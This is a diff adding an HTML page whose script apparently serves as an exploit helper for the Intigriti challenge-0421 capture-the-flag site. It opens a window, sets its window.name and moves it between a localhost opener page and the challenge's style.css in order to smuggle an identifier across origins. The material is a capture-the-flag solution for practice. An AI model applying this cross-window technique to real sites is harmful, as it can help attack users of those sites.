@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <link rel="icon" href="data:;base64,iVBORw0KGgo=" />
+  </head>
+  <body>
+    <script>
+      let currentIdentifier = "1";
+
+      function getIdentifier() {
+        return currentIdentifier;
+      }
+
+      async function setIdentifier(identifier) {
+        console.log("CHANGE GUESS CALLED", identifier);
+        if (identifier == currentIdentifier) return;
+        checkWindow.location = `http://localhost:3000/opener.html?not`;
+        await waitUntilWriteable(checkWindow);
+
+        checkWindow.name = "" + identifier;
+        checkWindow.location = `https://challenge-0421.intigriti.io/style.css`;
+        currentIdentifier = "" + identifier;
+        await waitForLocationChange(
+          checkWindow,
+          `https://challenge-0421.intigriti.io/style.css`
+        );
+      }
+
+      async function waitForLocationChange(windowReference, location) {
+        return new Promise((resolve) => {
+          const handle = setInterval(() => {
+            try {
+              if (windowReference.location.href.includes(location)) {
+                clearInterval(handle);
+                setTimeout(resolve, 100);
+              }
+            } catch (e) {}
+          });
+        });
+      }
+
+      async function waitUntilWriteable(windowReference) {
+        return new Promise((resolve) => {
+          const handle = setInterval(() => {
+            try {
+              if (windowReference.name.length) {
+                clearInterval(handle);
+                setTimeout(resolve, 100);
+              }
+            } catch (e) {}
+          });
+        });
+      }
+
+      (async () => {
+        checkWindow = window.open(`http://localhost:3000/opener.html`, "1");
+        await waitForLocationChange(
+          checkWindow,
+          `http://localhost:3000/opener.html`
+        );
+        checkWindow.location = `https://challenge-0421.intigriti.io/style.css`;
+      })();
+    </script>
+  </body>
+</html>
